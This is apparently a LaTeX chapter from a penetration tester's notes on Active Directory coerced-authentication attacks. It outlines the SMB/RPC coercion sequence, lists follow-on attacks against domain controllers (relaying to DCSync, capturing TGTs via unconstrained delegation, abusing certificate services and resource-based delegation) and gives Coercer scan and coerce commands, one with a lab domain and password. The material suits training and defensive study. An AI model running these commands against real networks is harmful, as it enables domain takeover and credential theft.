\chapter{Coreced auths attacks}
\label{ad:auth-coercion}
\section{Introduction}

regardless of there being a plethora of them, almost all use the same sequence of operations:
\begin{enumerate}
    \item 
        Authenticate to a remote machine using valid domain credentials (usually over SMB).
    \item
        Connect to a remote SMB pipe such as \verb+\PIPE\netdfs+, \verb+\PIPE\efsrpc+, \verb+\PIPE\lsarpc+, or \verb+\PIPE\lsass+.
    \item
        Bind to an RPC protocol to call its methods on an arbitrary target machine.
\end{enumerate}


\subsection{DC coercion}

coercing a DC to authenticate allow the following attacks:
\begin{itemize}
    \item Relay the connection to another DC and perform DCSync (if SMB Signing is disabled).
    \item Force the Domain Controller to connect to a machine configured for Unconstrained Delegation (UD) (case of a DC) - this will cache the TGT in the memory of the UD server, which can be captured/exported with tools like Rubeus and Mimikatz.
    \item Relay the connection to Active Directory Certificate Services to obtain a certificate for the Domain Controller. Threat agents can then use the certificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).
    \item Relay the connection to configure Resource-Based Kerberos Delegation for the relayed machine. We can then abuse the delegation to authenticate as any Administrator to that machine.
\end{itemize}



\input{ad/coerce/webdav}
\input{ad/coerce/printerbug}
\input{ad/coerce/printspooler}
\input{ad/coerce/petitpotam}
\input{ad/coerce/dfscoerce}
\input{ad/coerce/shadowcoerce}
\input{ad/coerce/pushsubscription}

\section{tools}
\subsection{coercer}

\href{https://github.com/p0dalirius/Coercer}{Coercer} is a powerful authentication coercion tool that automates the abuse of 17 methods in 5 RPC protocols

\subsubsection{Scan mode}
\begin{verbatim}
Coercer scan -t ip -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -d inlanefreight.local -v
\end{verbatim}

\subsubsection{Coerce mode}
\begin{verbatim}
Coercer coerce -t <target_ip> -l <listener_ip> -u <login> -p <password> -d <domain> \
    -v --always-continue
\end{verbatim}

\subsubsection{HTTP NTLM Authentication Coercion}

\begin{verbatim}
ython3 Coercer.py -t <target_ip> -u <login> -p <passwors> -wh SUPPORTPC2 -wp 80 -v
\end{verbatim}


\section{links}
\begin{itemize}
    \item 
        \href{https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications}{The
        Hacker Recipes :  MITM and coerced auths}
\end{itemize}
